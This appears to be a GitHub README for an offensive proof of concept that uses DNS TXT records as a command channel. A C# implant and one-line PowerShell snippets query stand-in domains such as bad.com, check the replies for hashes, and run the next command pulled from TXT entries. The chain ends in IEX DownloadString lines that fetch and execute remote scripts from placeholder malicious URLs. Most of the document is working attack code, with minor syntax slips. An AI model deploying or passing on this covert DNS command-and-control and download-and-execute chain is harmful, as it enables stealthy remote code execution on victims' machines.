## **1. Decision making**

- In the following Proof of Concept, CSharp code is compiled and was used as an agent on a target. The purpose is to make the first request.
- Powershell is utilised as TXT entries at the dns servers

The following is a demonstration of how TXT entries in dns servers can be utilized to make decisions based on their content.
1. a request is made: ```powershell (nslookup -q=txt bad.com)[5]```
2. the response is evaluated for a specific content (eg. hash, command, etc.)
3. according to the content of the response, an "if - else" statement will be executed (3.a./3.b.)

![decision_1](https://github.com/user-attachments/assets/d4516b8d-db16-4bc3-8b22-eaefda39700d)


##### Code:
```powershell
Powershell:
$output = nslookup -q=txt bad.com

# Search for the presence of the string "ls" in the output
if ($output | Select-String -Pattern "ls") { 

	#Write-Output "The keyword 'ls' was found in the TXT records."
    $first_command = powershell (nslookup -q=txt bad-1.com)[5]
    $first_command
    
	} else { 

	#Write-Output "The keyword 'ls' was not found in the TXT records." 
    $second_command = powershell (nslookup -q=txt bad-2.com)[6]
    $second_command

	}}
```


```csharp
CSharp:
// Check if the result contains "9fe8ec4dc33fd875e8fa6560f65f9be8"
if (result.Contains("9fe8ec4dc33fd875e8fa6560f65f9be8"))
{ 

	// If the result contains "9fe8ec4dc33fd875e8fa6560f65f9be8", run a new command
	Console.WriteLine("Output contains '9fe8ec4dc33fd875e8fa6560f65f9be8', executing new command...");
	
	string newCommand = "powershell (nslookup -q=txt bad-1.com)[6]"; // Example: You can run any command here
	string newResult = RunPowerShellCommand(newCommand);
	
	// Print the results of the new command
	Console.WriteLine(newResult);
}
else
{
	// If "9fe8ec4dc33fd875e8fa6560f65f9be8" is not found, execute this code block
	string newerCommand = "powershell (nslookup -q=txt bad-2.com)[5]";
	string newerResult = RunPowerShellCommand(newerCommand);

	// Print the results of the new command
	Console.WriteLine(result);
}
```

## **2. Decision making - Pivoting (simple)**
The decision is made on the client

![pivoting1_simple](https://github.com/user-attachments/assets/b0b6e5d7-c9b5-41b2-b082-7d9d6ba00ae4)


1. First-Base:
Request to original dns at bad.com to get TXT entries.
``` nslookup -q=txt bad.com ```

2. The request is received and evaluated for a certain string/hash
If certain content is present, executes the according TXT entry:  
``` echo 'FIRST-BASE' > first_base.txt;powershell (nslookup -q=txt bad-1.com)[5] ```  
If not present, make a text file containing a humble message (continue at 5)

3. Second-Base:
Then proceed to bad-1.com which contains the next command to execute  
``` echo 'SECOND_BASE' > second_base.txt;powershell (nslookup -q=txt bad-2.at)[5] ```

4. Third-Base:
Request to kqmg.at
``` echo 'THIRD-BASE' > third_base.txt ```

5. No-Base:
Execute the fall back command in an else-statement and exit:  
<code>powershell (nslookup -q=txt some-domain.com)[5]</code>  
The fall-back domain has the following TXT entry:  
``` echo 'Nothing here to see or gain. Better luck next time' > nothing_here.txt ```

Full code here (C#): [Implants](https://github.com/Dood3/NSHookup/tree/main/nshookup_SRC/implants)

## **2. Decision making - Pivoting (multi-hop)**

Template of a TXT entry on the 1st dns server is Powershell in one line (204 characters).
The oneliner declares the content of the response from the nslookup command as variable. Then it looks for the string "ls".  
The if-else statement declares also each nslookup requests as a variable which will be executed accordingly.  
The limit of characters in a TXT entry is 255:
```powershell
$output = nslookup -q=txt bad.com;if ($output | Select-String -Pattern "ls") { $first = powershell (nslookup -q=txt kqmg.at)[5];$first } else { $second = powershell (nslookup -q=txt bad.com)[6];$second }
```

#### *TXT Entries:*
bad.com:
```
"9fe8ec4dc33fd875e8fa6560f65f9be8"
```
bad-1.com:
```powershell
$o=nslookup -q=txt bad-2.com;if($o|Select-String -Pattern "4098f361bd6eccd44b7ac4948d770a60"){$f=powershell (nslookup -q=txt bad-2.com)[6];$f}else{$s=powershell (nslookup -q=txt bad-3.com)[5];$s}
```
bad-2.com:
```powershell
4098f361bd6eccd44b7ac4948d770a60;$o=nslookup -q=txt bad-2.com;if($o|Select-String -Pattern "3f33323aef889606589b98fbb62c112e"){$f=powershell (nslookup -q=txt bad-2.com)[6];$f}else{$s=powershell (nslookup -q=txt no-success.com)[5];$s}
```
bad-3.com:
```powershell
f6fd44d24b96ca51092b17bcb1048ac4;$o=nslookup -q=txt bad-4.com;if($o|Select-String -Pattern "sdfsgfdssgfdsg"){$f=powershell notepad.exe;$f}else{$s=powershell (nslookup -q=txt bad-4.com)[10];$s}
```
bad-4.com:
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://some-malicious-mischief.ps1')|iex
```
no-success.com:
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://blah.com/mischief.ps1')|iex
```
![pivoting1_multi](https://github.com/user-attachments/assets/b2d86162-0ad1-442c-b238-751876213068)


**Explanation:**

1. The implant "pivoting.exe" makes a request to bad.com with ```nslookup -q=txt bad.com```. In this case the TXT entry contains a checksum/hash:
```bad.com text = "9fe8ec4dc33fd875e8fa6560f65f9be8;"```

2. If the hash is received in the response, it executes <code>powershell (nslookup -q=txt bad-1.com)[13]</code> to another domain, which indexes the 13th TXT entry at <code>bad-1.com</code> (in this case 196 characters).
Otherwise, if the hash is not present, "pivoting.exe" leaves a text file with an error message and exits.

3. Following a successful event with the hash present, <code>bad-1.com</code> is requested, which contains the following TXT entry at the 13th position:
```powershell
$o=nslookup -q=txt bad-2.com;if($o|Select-String -Pattern "4098f361bd6eccd44b7ac4948d770a60"){$f=powershell (nslookup -q=txt bad-2.com)[6];$f}else{$s=powershell (nslookup -q=txt bad-3.com)[5];$s}
```

4. ```bad-2.com``` has a TXT entry of (235 characters):
```powershell
4098f361bd6eccd44b7ac4948d770a60;$o=nslookup -q=txt bad-2.com;if($o|Select-String -Pattern "3f33323aef889606589b98fbb62c112e"){$f=powershell (nslookup -q=txt bad-2.com)[6];$f}else{$s=powershell (nslookup -q=txt no-success.com)[5];$s}
```
Again, if the hash is returned, a request to ```bad-2.com``` is made, which contains the following TXT entry:
```powershell
3f33323aef889606589b98fbb62c112e;$o=nslookup -q=txt bad-3.com;if($o|Select-String -Pattern "f6fd44d24b96ca51092b17bcb1048ac4"){$f=powershell (nslookup -q=txt bad-3.com)[6];$f}else{$s=powershell calc.exe;$s}
```
Upon successful retrieval of the hash, ```bad-3.com``` is requested. Otherwise ```calc.exe``` will be opened.

5. ```bad-3.com``` houses the TXT entry:
```powershell
f6fd44d24b96ca51092b17bcb1048ac4;$o=nslookup -q=txt bad-4.com;if($o|Select-String -Pattern "sdfsgfdssgfdsg"){$f=powershell notepad.exe;$f}else{$s=powershell (nslookup -q=txt bad-4.com)[10];$s}
```
As long as the hash is found, ```notepad.exe``` will be opened. Otherwise the next request to ```bad-4.com``` is made, which houses the last TXT entry in this chain.

6. ```bad-4.com``` houses the TXT entry:
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://some-malicious-mischief.ps1'|iex)
```
